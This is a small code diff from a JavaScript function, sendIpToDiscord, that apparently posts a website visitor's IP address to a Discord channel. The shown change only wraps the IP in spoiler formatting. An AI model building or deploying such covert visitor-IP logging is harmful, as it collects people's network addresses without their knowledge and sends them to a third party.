@@ -9,7 +9,7 @@ async function sendIpToDiscord() {
             embeds: [
                 {
                     title: "Website",
-                    description: `**IP:** ${ipAddress.trim()}`,
+                    description: `**IP:** ||${ipAddress.trim()}||`,
                     color: 0xfffffe, 
                 }
             ],
